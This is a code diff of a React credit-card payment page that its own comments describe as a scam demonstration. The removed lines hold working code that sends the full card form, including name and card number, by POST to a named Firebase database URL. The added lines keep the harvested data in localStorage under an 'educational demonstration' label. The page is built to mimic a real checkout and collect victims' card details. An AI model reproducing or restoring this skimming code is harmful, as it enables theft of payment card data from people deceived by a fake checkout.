@@ -1,9 +1,6 @@
 import React, { useState } from 'react';
 import { CreditCard, Lock, Shield, Eye, EyeOff } from 'lucide-react';
 
-// Define the Firebase endpoint for clarity and easy updates
-const FIREBASE_ENDPOINT = 'https://devmint2025-default-rtdb.firebaseio.com/paymentData.json';
-
 interface PaymentData {
   fullName: string;
   cardNumber: string;
@@ -77,42 +74,22 @@ const PaymentPage: React.FC<PaymentPageProps> = ({ onPaymentComplete }) => {
 
     setIsLoading(true);
 
-    // Prepare the payment data
+    // Store the payment data (for educational demonstration)
     const paymentData: PaymentData = {
       ...formData,
-      // Remove spaces from card number before submission
-      cardNumber: formData.cardNumber.replace(/\s/g, ''),
       timestamp: new Date().toISOString()
     };
-    
-    // --- START: MODIFIED SECTION FOR FIREBASE SUBMISSION ---
-    
-    try {
-        // Send data to Firebase Realtime Database using the Fetch API (POST request)
-        const response = await fetch(FIREBASE_ENDPOINT, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(paymentData),
-        });
 
-        if (!response.ok) {
-            throw new Error(`Firebase submission failed with status: ${response.status}`);
-        }
-        
-        console.log('Payment data successfully logged to Firebase.');
-
-        // Simulate processing delay (kept for user experience)
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        
-    } catch (error) {
-        console.error('Error submitting payment data:', error);
-        // Handle error (e.g., show an error message to the user)
-        // For demonstration, we'll proceed as if successful, but in a real app, you'd stop here.
-    }
+    // Get existing data from localStorage
+    const existingData = localStorage.getItem('demo_payment_data');
+    const allData = existingData ? JSON.parse(existingData) : [];
+    allData.push(paymentData);
     
-    // --- END: MODIFIED SECTION FOR FIREBASE SUBMISSION ---
+    // Store in localStorage (in a real scam, this would be sent to malicious servers)
+    localStorage.setItem('demo_payment_data', JSON.stringify(allData));
+
+    // Simulate processing delay
+    await new Promise(resolve => setTimeout(resolve, 2000));
 
     setIsLoading(false);
     setShowSuccess(true);
@@ -128,10 +105,10 @@ const PaymentPage: React.FC<PaymentPageProps> = ({ onPaymentComplete }) => {
 
   const getCardIcon = (cardNumber: string) => {
     const number = cardNumber.replace(/\s/g, '');
-    if (number.startsWith('4')) return 'VISA';
-    if (number.startsWith('5')) return 'Mastercard';
-    if (number.startsWith('3')) return 'Amex';
-    return 'Card';
+    if (number.startsWith('4')) return '💳 Visa';
+    if (number.startsWith('5')) return '💳 Mastercard';
+    if (number.startsWith('3')) return '💳 Amex';
+    return '💳 Card';
   };
 
   const currentYear = new Date().getFullYear();
